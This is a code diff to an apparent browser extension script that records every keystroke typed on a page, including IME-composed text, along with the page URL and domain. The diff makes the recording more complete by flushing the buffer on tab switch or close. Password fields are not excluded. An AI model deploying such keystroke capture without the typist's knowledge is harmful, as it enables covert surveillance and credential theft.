@@ -39,8 +39,38 @@ function saveEvent(type, data) {
 }
 
 // ── Global keydown capture ────────────────────────────────────────────────────
+// Two real bugs fixed here (found 10 Oct):
+//  1) recorded_at was stamped at FLUSH time (up to 3s after the pause, or far
+//     later for a long unbroken typing run), not when typing actually started.
+//     We now track the buffer's own start time and send it as started_at, so
+//     the event's real-world timing is correct even though we still batch.
+//  2) The buffer lived only in this tab's JS memory with nothing flushing it
+//     on tab close/switch/navigate — a message typed and then the tab is
+//     closed or you alt-tab within the 3s window was silently lost. We now
+//     flush immediately on visibilitychange (tab hidden) and pagehide.
+//  3) IME input (Hindi/other composed scripts via an input method) doesn't
+//     fire normal single-char keydown events — compositionend now captures
+//     the composed text as its own event so that typing isn't dropped.
 let keystrokeBuffer = "";
+let keystrokeBufferStart = null;
 let keystrokeTimer  = null;
+
+function flushKeystrokeBuffer() {
+  clearTimeout(keystrokeTimer);
+  keystrokeTimer = null;
+  if (keystrokeBuffer.trim().length === 0) { keystrokeBuffer = ""; keystrokeBufferStart = null; return; }
+  saveEvent("keystroke_text", {
+    text:         keystrokeBuffer,
+    field_type:   "keydown_global",
+    is_chat:      !!platform,
+    domain:       location.hostname.replace("www.", ""),
+    url:          location.href,
+    source:       "browser",
+    started_at:   keystrokeBufferStart ? new Date(keystrokeBufferStart).toISOString() : null,
+  });
+  keystrokeBuffer = "";
+  keystrokeBufferStart = null;
+}
 
 document.addEventListener("keydown", (e) => {
   if (["Shift","Control","Alt","Meta","CapsLock","Tab","Escape",
@@ -49,6 +79,10 @@ document.addEventListener("keydown", (e) => {
        "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"].includes(e.key)) {
     return;
   }
+  // Composed input (IME) delivers its characters via compositionend, not as
+  // a normal single-char keydown - skip here so we don't double-capture.
+  if (e.isComposing) return;
+  if (keystrokeBuffer === "") keystrokeBufferStart = Date.now();
   if (e.key === "Enter")          keystrokeBuffer += "\n";
   else if (e.key === "Backspace") keystrokeBuffer += "[⌫]";
   else if (e.key === "Delete")    keystrokeBuffer += "[Del]";
@@ -56,19 +90,22 @@ document.addEventListener("keydown", (e) => {
   else if (e.key.length === 1)    keystrokeBuffer += e.key;
 
   clearTimeout(keystrokeTimer);
-  keystrokeTimer = setTimeout(() => {
-    if (keystrokeBuffer.trim().length === 0) return;
-    saveEvent("keystroke_text", {
-      text:       keystrokeBuffer,
-      field_type: "keydown_global",
-      is_chat:    !!platform,
-      domain:     location.hostname.replace("www.", ""),
-      url:        location.href,
-      source:     "browser",
-    });
-    keystrokeBuffer = "";
-  }, 3000);
+  keystrokeTimer = setTimeout(flushKeystrokeBuffer, 3000);
 }, true);
+
+// IME composition (Hindi and other composed scripts): the composed text
+// arrives whole on compositionend and never passes through keydown above.
+document.addEventListener("compositionend", (e) => {
+  if (!e.data) return;
+  if (keystrokeBuffer === "") keystrokeBufferStart = Date.now();
+  keystrokeBuffer += e.data;
+  clearTimeout(keystrokeTimer);
+  keystrokeTimer = setTimeout(flushKeystrokeBuffer, 3000);
+}, true);
+
+// Don't lose an in-progress buffer to a tab switch, navigation or close.
+document.addEventListener("visibilitychange", () => { if (document.visibilityState === "hidden") flushKeystrokeBuffer(); });
+window.addEventListener("pagehide", flushKeystrokeBuffer);
 
 // ── Chat send detection ───────────────────────────────────────────────────────
 if (platform) {
